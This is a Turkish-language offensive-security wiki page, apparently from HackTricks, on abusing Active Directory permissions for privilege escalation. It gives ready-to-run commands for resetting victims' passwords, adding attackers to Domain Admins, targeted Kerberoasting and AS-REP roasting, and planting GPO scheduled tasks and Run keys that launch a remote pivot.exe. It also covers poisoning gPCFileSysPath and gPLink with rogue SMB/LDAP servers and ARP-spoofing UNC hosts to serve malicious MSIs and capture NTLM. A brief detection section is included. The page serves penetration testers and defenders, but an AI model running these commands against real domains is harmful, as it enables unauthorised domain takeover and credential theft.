# Active Directory ACL'lerini/ACE'lerini Kötüye Kullanma

{{#include ../../../banners/hacktricks-training.md}}

**Bu sayfa çoğunlukla** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **içindeki tekniklerin özetidir. Daha fazla bilgi için orijinal makalelere göz atın.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Kullanıcı Üzerinde GenericAll Hakları**

Bu ayrıcalık, saldırgana hedef kullanıcı hesabı üzerinde tam denetim sağlar. `Get-ObjectAcl` komutuyla `GenericAll` hakları doğrulandıktan sonra saldırgan şunları yapabilir:

- **Hedefin Parolasını Değiştirme**: Saldırgan, `net user <username> <password> /domain` komutunu kullanarak kullanıcının parolasını sıfırlayabilir.
- Linux'tan aynı işlemi Samba `net rpc` ile SAMR üzerinden yapabilirsiniz:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Hesap devre dışıysa UAC bayrağını kaldırın**: `GenericAll`, `userAccountControl` düzenlemeye izin verir. Linux'tan BloodyAD, `ACCOUNTDISABLE` bayrağını kaldırabilir:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Hesabı kerberoastable hale getirmek için kullanıcının hesabına bir SPN atayın, ardından ticket-granting ticket (TGT) hash'lerini çıkarmak ve kırmayı denemek için Rubeus ve targetedKerberoast.py kullanın.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Kullanıcı için pre-authentication'ı devre dışı bırakarak hesabını ASREPRoasting'e karşı savunmasız hâle getirin.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Bir kullanıcı üzerinde `GenericAll` yetkiniz varsa, parolasını değiştirmeden sertifika tabanlı bir kimlik bilgisi ekleyebilir ve o kullanıcı olarak kimlik doğrulaması yapabilirsiniz. Bkz.:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Grup Üzerinde GenericAll Hakları**

Bu ayrıcalık, saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` hakları varsa grup üyeliklerini değiştirmesine olanak tanır. `Get-NetGroup` ile grubun distinguished name değerini belirledikten sonra saldırgan şunları yapabilir:

- **Kendilerini Domain Admins Grubuna Ekleme**: Bu, doğrudan komutlar kullanılarak veya Active Directory ya da PowerSploit gibi modüller aracılığıyla yapılabilir.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Linux’tan, üzerinde GenericAll/Write üyelik yetkisine sahip olduğunuz rastgele gruplara kendinizi eklemek için BloodyAD’den de yararlanabilirsiniz. Hedef grup “Remote Management Users” grubunun içinde yer alıyorsa, bu grubu dikkate alan sunucularda hemen WinRM erişimi kazanırsınız:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **Computer/User Üzerinde GenericAll / GenericWrite / Write**

Bir computer object veya user account üzerinde bu ayrıcalıklara sahip olmak şunları sağlar:

- **Kerberos Resource-based Constrained Delegation**: Bir computer object'in ele geçirilmesini sağlar.
- **Shadow Credentials**: Shadow credentials oluşturma ayrıcalıklarından yararlanarak bir computer veya user account kimliğine bürünmek için bu tekniği kullanın.

## **Group Üzerinde WriteProperty**

Bir kullanıcı belirli bir group'taki (ör. `Domain Admins`) tüm nesneler için `WriteProperty` haklarına sahipse şunları yapabilir:

- **Kendini Domain Admins Group'a Ekleme**: `net user` ve `Add-NetGroupUser` komutları birlikte kullanılarak gerçekleştirilebilen bu yöntem, domain içinde ayrıcalık yükseltmeye olanak tanır.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Grup üzerinde Self (Self-Membership)**

Bu ayrıcalık, saldırganların grup üyeliğini doğrudan değiştiren komutlarla kendilerini `Domain Admins` gibi belirli gruplara eklemelerini sağlar. Aşağıdaki komut dizisi, kişinin kendisini gruba eklemesine olanak tanır:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Benzer bir ayrıcalık olan bu hak, saldırganların gruplar üzerinde `WriteProperty` yetkileri varsa grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır. Bu ayrıcalığın doğrulanması ve kullanılması şu şekilde gerçekleştirilir:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Bir kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight` yetkisine sahip olmak, mevcut parolayı bilmeden parola sıfırlamaya olanak tanır. Bu yetkiyi doğrulamak ve kötüye kullanmak PowerShell veya alternatif komut satırı araçlarıyla mümkündür. Kullanıcının parolasını sıfırlamak için etkileşimli oturumlar ve etkileşimsiz ortamlar için tek satırlık komutlar da dahil olmak üzere çeşitli yöntemler kullanılabilir. Komutlar, basit PowerShell komutlarından Linux'ta `rpcclient` kullanımına kadar uzanarak saldırı vektörlerinin çeşitliliğini gösterir.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **Grup üzerinde WriteOwner**

Bir saldırgan, bir grup üzerinde `WriteOwner` haklarına sahip olduğunu tespit ederse grubun sahipliğini kendisine geçirebilir. Söz konusu grup `Domain Admins` ise bu özellikle etkilidir; çünkü sahipliği değiştirmek, grup öznitelikleri ve üyeliği üzerinde daha geniş denetim sağlar. Süreç, `Get-ObjectAcl` ile doğru nesneyi belirlemeyi ve ardından sahibi SID veya ad kullanarak değiştirmek için `Set-DomainObjectOwner` kullanmayı içerir.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **Kullanıcı Üzerinde GenericWrite**

Bu izin, saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle `GenericWrite` erişimiyle saldırgan, kullanıcı oturum açtığında kötü amaçlı bir betiğin çalıştırılması için kullanıcının oturum açma betiği yolunu değiştirebilir. Bunun için `Set-ADObject` komutu kullanılarak hedef kullanıcının `scriptpath` özelliği saldırganın betiğini gösterecek şekilde güncellenir.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Daha dar kapsamlı ve kullanıcının [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) özniteliğiyle sınırlı bir `WriteProperty` ACE yeterli olabilir; `GenericWrite` gerekli değildir. Bu öznitelik yetkisini, etki alanının `SYSVOL\<domain>\scripts` veya `NETLOGON` ağacındaki yazılabilir bir script ile birlikte değerlendirin; ardından hedef kullanıcının oturum açma ve script’e erişme olasılığını inceleyin. Script, oturum açıldığında o kullanıcının bağlamında çalışır. Etkin AD ACL’lerini ve dosya/paylaşım ACL’lerini ayrı ayrı inceleyin; eşleşen bir Allow ACE veya tek başına yazılabilir bir dizin, gerekli erişim yolunun tamamını kanıtlamaz.

## **Grupta GenericWrite**

Bu ayrıcalıkla saldırganlar, kendilerini veya başka kullanıcıları belirli gruplara eklemek gibi işlemlerle grup üyeliğini değiştirebilir. Bu süreç; bir credential object oluşturmayı, bunu kullanarak kullanıcıları bir gruba eklemeyi veya gruptan çıkarmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux'tan Samba `net`, grup üzerinde `GenericWrite` yetkiniz varsa üye ekleyip kaldırabilir (PowerShell/RSAT kullanılamadığında kullanışlıdır):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Bir AD nesnesine sahip olmak ve bu nesne üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, saldırganın nesne üzerinde kendisine `GenericAll` ayrıcalıkları vermesini sağlar. Bu işlem, ADSI manipülasyonu yoluyla gerçekleştirilir ve nesne üzerinde tam denetim sağlamanın yanı sıra grup üyeliklerini değiştirme olanağı sunar. Buna rağmen, Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet’lerini kullanarak bu ayrıcalıklardan yararlanmaya çalışırken bazı kısıtlamalar vardır.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner ile hızlı ele geçirme (PowerView)

Bir kullanıcı veya hizmet hesabı üzerinde `WriteOwner` ve `WriteDacl` izinlerine sahipseniz, eski parolayı bilmeden PowerView kullanarak hesabın tam kontrolünü ele geçirebilir ve parolasını sıfırlayabilirsiniz:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notlar:
- Yalnızca `WriteOwner` izniniz varsa önce sahipliği kendinize geçirmeniz gerekebilir:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Parola sıfırlama işleminden sonra herhangi bir protokolle (SMB/LDAP/RDP/WinRM) erişimi doğrulayın.

## **Etki Alanında Replikasyon (DCSync)**

DCSync saldırısı, Domain Controller'ı taklit edip kullanıcı kimlik bilgileri dahil verileri senkronize etmek için etki alanındaki belirli replikasyon izinlerinden yararlanır. Bu güçlü teknik, saldırganların Domain Controller'a doğrudan erişmeden AD ortamındaki hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinler gerektirir.<sup>[[5]](#references)</sup> [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)

## GPO Yetkilendirmesi <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Yetkilendirmesi

Group Policy Objects (GPO'lar) yönetmek için devredilen erişim, önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredildiyse, bu kullanıcı **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. Bu izinler kötü amaçlarla kötüye kullanılabilir. PowerView kullanılarak tespit edilebilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO İzinlerini Numaralandırma

Yanlış yapılandırılmış GPO'ları belirlemek için PowerSploit cmdlet'leri zincirleme kullanılabilir. Böylece belirli bir kullanıcının yönetme iznine sahip olduğu GPO'lar bulunabilir: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir Politikanın Uygulandığı Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını belirleyerek olası etkinin kapsamını anlamak mümkündür. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara hangi politikaların uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Belirli Bir Politikanın Uygulandığı OU'lar**: Belirli bir politikadan etkilenen organizasyon birimleri (OU'lar), `Get-DomainOU` kullanılarak belirlenebilir.

GPO'ları numaralandırmak ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.

### GPO'yu Kötüye Kullanma - New-GPOImmediateTask

Yanlış yapılandırılmış GPO'lar, örneğin anında çalışan bir zamanlanmış görev oluşturularak kod yürütmek için istismar edilebilir. Bu yöntem, etkilenen makinelerde bir kullanıcıyı yerel yöneticiler grubuna ekleyerek ayrıcalıkları önemli ölçüde yükseltmek için kullanılabilir:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

GroupPolicy modülü, yüklüyse, yeni GPO'lar oluşturup bunları bağlamaya ve etkilenen bilgisayarlarda backdoor'ları çalıştırmak için kayıt defteri değerleri gibi tercihleri ayarlamaya olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve çalıştırılabilmesi için bir kullanıcının bilgisayarda oturum açmasını gerektirir:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - GPO'yu Kötüye Kullanma

SharpGPOAbuse, yeni GPO'lar oluşturma gereği olmadan görevler ekleyerek veya ayarları değiştirerek mevcut GPO'ları kötüye kullanmanın bir yolunu sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### İlke Güncellemesini Zorlama

GPO güncellemeleri genellikle yaklaşık her 90 dakikada bir gerçekleşir. Bu süreci, özellikle bir değişiklik uyguladıktan sonra hızlandırmak için hedef bilgisayarda `gpupdate /force` komutu kullanılarak ilke güncellemesi hemen zorlanabilir. Bu komut, GPO’larda yapılan değişikliklerin bir sonraki otomatik güncelleme döngüsü beklenmeden uygulanmasını sağlar.

### İşleyişin Ayrıntıları

`Misconfigured Policy` gibi belirli bir GPO’nun Zamanlanmış Görevleri incelendiğinde, `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan betikler ya da komut satırı araçları aracılığıyla oluşturulur.

`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterilen görev yapısı, çalıştırılacak komut ve tetikleyiciler dahil olmak üzere zamanlanmış görevin ayrıntılarını belirtir. Bu dosya, zamanlanmış görevlerin GPO’lar içinde nasıl tanımlanıp yönetildiğini gösterir ve ilke uygulamasının bir parçası olarak rastgele komutlar veya betikler çalıştırmaya olanak tanır.

### Kullanıcılar ve Gruplar

GPO’lar ayrıca hedef sistemlerdeki kullanıcı ve grup üyeliklerinin değiştirilmesine de olanak tanır. Kullanıcılar ve Gruplar ilke dosyaları doğrudan düzenlenerek saldırganlar, kullanıcıları yerel `administrators` grubu gibi ayrıcalıklı gruplara ekleyebilir. GPO yönetim izinlerinin devredilmesi, yeni kullanıcılar eklemek veya grup üyeliklerini değiştirmek üzere ilke dosyalarının değiştirilmesine izin verdiğinden bu mümkündür.

Kullanıcılar ve Gruplar için XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını gösterir. Bu dosyaya girdiler eklenerek belirli kullanıcılara etkilenen sistemlerde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla ayrıcalık yükseltmeye doğrudan bir yol sunar.

Yerel grup üyeliği ve kullanıcı hakları gibi güvenlik ayarları için, `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` konumundaki uygulanmış GPO şablonunu ve `SecEdit` dizininin ACL’sini de inceleyin. Yazılabilir bir dizin veya dosya, inceleme için bir ipucudur: etkin SYSVOL paylaşım erişimi, deny ve devralınan ACL’ler, Group Policy container izinleri, ilke kapsamı ve istemci yenilemesi; değişikliğin etkili olup olmayacağını belirlemeye devam eder. “GPO Managers” adlı bir gruba üyelik tek başına düzenleme hakkı vermez. [Microsoft bu şablon yolunu ve Group Policy container/şablon ayrımını belgeliyor.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Ayrıca, oturum açma/kapatma betiklerinden yararlanma, otomatik çalıştırma için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya hizmet yapılandırmalarını düzenleme gibi kod çalıştırma ya da kalıcılığı sürdürmeye yönelik ek yöntemler de değerlendirilebilir. Bu teknikler, GPO’ların kötüye kullanılması yoluyla erişimi sürdürmek ve hedef sistemleri kontrol etmek için çeşitli yollar sunar.

### GPC/GPT alımını kimlik doğrulamalı sahte hizmetlere yönlendirme

Bir GPO; meta verileri içeren bir LDAP **Group Policy Container (GPC)** ve ilke dosyalarını barındıran bir SMB **Group Policy Template (GPT)** bileşeninden oluşur. Yenileme sırasında istemci, container’ın `gPLink` değerini izler, başvurulan GPC’yi ve `gPCFileSysPath` değerini okur, ardından GPT’yi bu UNC yolundan indirir. Sonuç olarak, GPC’nin kendisine veya bir OU, Site ya da Domain’in `gPLink` değerine yazma erişimi, ayrıcalıklı ilke işlemesine dönüştürülebilir.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddity ile `gPCFileSysPath` zehirleme

Kontrol edilen principal hedef GPC’ye yazabiliyorsa (doğrudan ya da **LDAP’e NTLM relay** yoluyla), `gPCFileSysPath` değerini saldırganın barındırdığı bir UNC yoluyla değiştirin. [GPOddity](https://github.com/synacktiv/GPOddity), LDAP değişikliğini otomatikleştirir ve Group Policy istemcisinin `NT AUTHORITY\SYSTEM` olarak çalıştırdığı modül tabanlı ilke dosyaları veya bir Immediate Task içeren kötü amaçlı bir GPT sunar.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonim veya kimlik bilgilerine bakılmaksızın erişilebilen bir SMB paylaşımı, güncel Windows istemcilerinde yeterli değildir: SMB Secure Negotiate, kimlik doğrulamanın başarılı olduğunun kanıtlanmasını gerektirir. Bu nedenle sahte hizmetin etki alanı kimliğini doğrulaması, SMB oturum anahtarını türetmesi ve yanıtlarını doğru şekilde imzalaması gerekir. Gömülü modda GPOddity’yi kontrol edilen bir makine hesabı ve bu hesabın hizmet anahtarıyla yapılandırın, ardından `[COMMANDS]` bölümünde bilgisayar veya kullanıcı tarafı payload’ını seçin.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Kullanıcı GPO uç durumu:** MS16-072 sonrasında Windows, **aynı TCP bağlantısında** hâlâ iki SMB2 oturumu oluşturur: kullanıcı oturumu `GPT.INI` dosyasını, ardından bilgisayar hesabı oturumu `ScheduledTasks.xml` gibi etkin yapılandırmaları okur. Bu nedenle sahte bir sunucu, kimlik doğrulama durumunu, oturum anahtarlarını ve imzalama anahtarlarını yalnızca sokete göre değil, SMB2 `SessionId` değerine göre de indekslemelidir. GPOddity/OUned içine gömülü Scapy fork'u bunu `SMBStreamSocketMultiplexing` ve çoklama destekli bir `SMBServer` üzerinden uygular; tek oturumlu Impacket/Scapy sunucuları aksi hâlde yanlış imzalama durumunu yeniden kullanır ve kullanıcı ilkelerinde başarısız olur.<sup>[[15]](#references)</sup>

#### OUned ile `gPLink` zehirleme

Bir OU, Site veya Domain üzerinde `WriteGPLink`, `GenericWrite` ya da eşdeğer kontrol sahibi olan bir saldırgan, GPC DN'si saldırganın kontrolündeki bir LDAP sunucusu tarafından sunulan bir bağlantı ekleyebilir. Bu yöntem ilk olarak Petros Koutroumpis tarafından tanıtılmıştır; [OUned](https://github.com/synacktiv/OUned), LDAP yazma işlemini ve kötü amaçlı GPC/GPT zincirini otomatikleştirir.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Kurban önce sahte LDAP hizmetinde kimlik doğrulaması yapar ve `gPCFileSysPath` değeri sahte SMB hizmetini gösteren bir GPC alır; ardından SMB'de kimlik doğrulaması yapar ve sağlanan GPT'yi uygular. Bu nedenle OUned'in LDAP SPN'sine sahip bir hesaba, SMB için HOST SPN'sine sahip bir makine hesabına (aynı makine hesabı her ikisini de karşılayabilir) ve 389 ile 445 numaralı portları operatörün ana bilgisayarına yönlendiren DNS çözümlemesine veya ters yönlendirmeye ihtiyacı vardır.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned'in yerleşik Scapy LDAP sunucusu, Kerberos/SPNEGO'yu gerçek denetimli service key ile doğrular ve JSON'dan keyfi GPC verileri sunar. Boş JSON key'i rootDSE'yi modeller, `base64:` önekleri binary değerleri temsil eder ve sunucu add/delete/modify/search işlemlerini ve `BASE`, `LEVEL` ile `SUBTREE` aramalarını destekler; koruma olmadan, integrity veya confidentiality ile anlaşma yapabilir. Böylece başka bir Windows bileşeni saldırgan kontrollü bir LDAP referansını izlerken authenticated LDAP konusunda ısrar ettiğinde bu hizmet yeniden kullanılabilir.<sup>[[15]](#references)</sup>

Bir hesap parolasını dummy bir domaine eşitlemenin her Kerberos key'ini yeniden oluşturduğunu varsaymayın: RC4 paroladan türetilirken AES string-to-key, principal'ın hostname/domain bilgisinden türetilen bir salt de kullanır. Gerçek hesap AES key'ini `KerberosSSP`'ye vermek, makine hesabının kendi kendine yazabildiği `msDS-SupportedEncryptionTypes` üzerinde tespit edilebilir bir değişiklik yaparak RC4'ü zorlamayı önler.<sup>[[15]](#references)</sup>

#### Tespit için inceleme noktaları

`gPCFileSysPath` veya `gPLink` değişikliklerini GPO sürüm değişiklikleri ve yeni Immediate/Scheduled Task XML dosyalarıyla ilişkilendirin. Beklenmeyen naming context'lere bağlantıları, onaylı DC/SYSVOL kümesinin dışındaki UNC host'larını, makine hesabı adlarını başka yere yönlendiren DNS kayıtlarını, sıra dışı makine hesaplarına ait LDAP/CIFS service ticket'larını ve RC4'ü etkinleştiren `msDS-SupportedEncryptionTypes` değişikliklerini inceleyin.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

Bir OU/domain üzerinde `WriteGPLink`, GPO'nun kendisini düzenlemeden hedef container'ın `gPLink` niteliğini değiştirmenize ve **mevcut bir GPO'yu uygulanmaya zorlamanıza** olanak tanır. Bağlanan GPO, **UNC path** (`\\HOST\share\...`) üzerinden uzak içeriğe zaten başvuruyorsa bu ilgi çekici hâle gelir; çünkü authenticated kullanıcılar **SYSVOL**'u okuyabilir ve yeniden kullanılabilir politikaları çevrimdışı olarak arayabilir.<sup>[[11]](#references)</sup>

Üst düzey iş akışı:

1. Bir OU üzerinde `WriteGPLink` yetkisine sahip bir principal belirlemek ve bu OU içindeki bilgisayarları/kullanıcıları listelemek için BloodHound kullanın.
2. `SYSVOL`'u salt okunur şekilde klonlayın ve UNC path'lere başvuran **Software Installation**, **drive mappings** (`Drives.xml`) ve **logon/startup scripts** aramak için GPO'ları ayrıştırın.
3. L2 spoofing ile yönlendirmek daha kolay olduğundan, DFS/domain-namespace path'leri yerine **doğrudan hostname'e** işaret eden politikaları tercih edin (örneğin `\\DC02\share\pkg.msi`).
4. Kurbanın önceden mevcut olan bu politikayı işlemesi için seçilen GPO GUID'sini hedef OU'nun `gPLink` niteliğine ekleyin.
5. Aynı broadcast domain üzerinde UNC host'una ARP spoofing uygulayın ve IP'sini yerel olarak bağlayın (`ip addr add <target_ip>/32 dev <iface>`); böylece kurbanın SMB trafiği sizin host'unuza ulaşır.
6. Beklenen path/filename'i bir saldırgan SMB sunucusundan sunun (örneğin `smbserver.py`) ve normal politika işleme sürecini bekleyin.

Örnek `SYSVOL` toplama ve GPO korelasyonu:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Mevcut GPO'yu hedef OU'ya bağlayın:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Bağlı GPO, bir MSI'ı UNC path üzerinden dağıtıyorsa istemci bu MSI'ı **computer startup** sırasında indirir ve **`NT AUTHORITY\SYSTEM`** olarak yükler. Başvurulan host'u spoof edip aynı **share/path/name** altında kötü amaçlı bir MSI sunarak **SYSVOL**'u değiştirmeden `WriteGPLink` üzerinden SYSTEM seviyesinde kod çalıştırabilirsiniz.

Önemli kısıtlamalar:

- **Zamanlama önemlidir**: Yeni bağlantı policy refresh sırasında (genellikle ~90 dakikada bir) görülür, ancak **Software Installation** genellikle **reboot** sırasında tetiklenir.
- Windows Installer, dağıtımı genellikle paketin **`ProductCode`** değeriyle takip eder. Ürün zaten yüklüyse dağıtım atlanabilir.
- Installer'ın paketi reddetmesini önlemek için rogue MSI'ı yamalayarak **`ProductCode`** ve **`PackageCode`** değerlerini GPO'nun beklediği meşru paketle eşleştirin.
- Eski `.aas` advertisement dosyaları `SYSVOL` içinde kalabilir. Bu yönteme güvenmeden önce dağıtımın hâlâ etkin göründüğünü doğrulayın.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` içindeki GPP drive mapping'leri, kullanıcıların oturum açarken veya yeniden bağlanırken yapılandırılmış UNC path'e kimlik doğrulaması yapmasına neden olur. Başvurulan host'u spoof ederseniz **NetNTLMv2** yakalayabilirsiniz. SMB'nin kasıtlı olarak başarısız olmasını sağlarsanız Windows, **WebDAV** üzerinden yeniden deneyebilir ve **HTTP üzerinden NTLM** gönderebilir. Bu, **LDAP(S)**, **AD CS** veya **SMB**'ye relay için çok daha fazla esneklik sağlar.

#### Logon/startup script UNC hijack

Aynı yöntem `SYSVOL` içinde bulunan UNC-hosted script'ler için de geçerlidir:

- **Logon script**'ler genellikle **user** bağlamında çalışır.
- **Startup script**'ler genellikle **computer / SYSTEM** bağlamında çalışır.

